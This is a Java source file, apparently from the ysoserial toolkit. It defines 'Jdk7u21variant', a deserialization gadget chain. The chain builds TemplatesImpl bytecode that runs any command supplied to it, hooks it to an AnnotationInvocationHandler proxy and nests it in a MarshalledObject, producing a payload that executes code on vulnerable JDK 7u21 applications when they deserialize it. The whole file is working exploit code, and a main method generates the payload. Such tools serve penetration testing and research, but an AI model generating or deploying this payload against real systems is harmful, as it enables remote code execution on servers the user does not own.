package ysoserial.payloads;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

/**
 * @program: ysoserial
 * @description: jdk 7u21 gadgets variant
 * @author: potats0
 * @create: 2021-04-19 16:55
 **/
@SuppressWarnings({ "rawtypes", "unchecked" })
@PayloadTest( precondition = "isApplicableJavaVersion")
@Dependencies()
@Authors({ Authors.POTATS0 })
public class Jdk7u21variant implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {

        final Object templates = Gadgets.createTemplatesImpl(command);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates);

        MarshalledObject marshalledObject = new MarshalledObject(set);
        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);

        set = new LinkedHashSet();
        set.add(marshalledObject);
        set.add(proxy);
        map.put(zeroHashCodeStr, marshalledObject);
        return set;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Jdk7u21variant.class, args);
    }
}
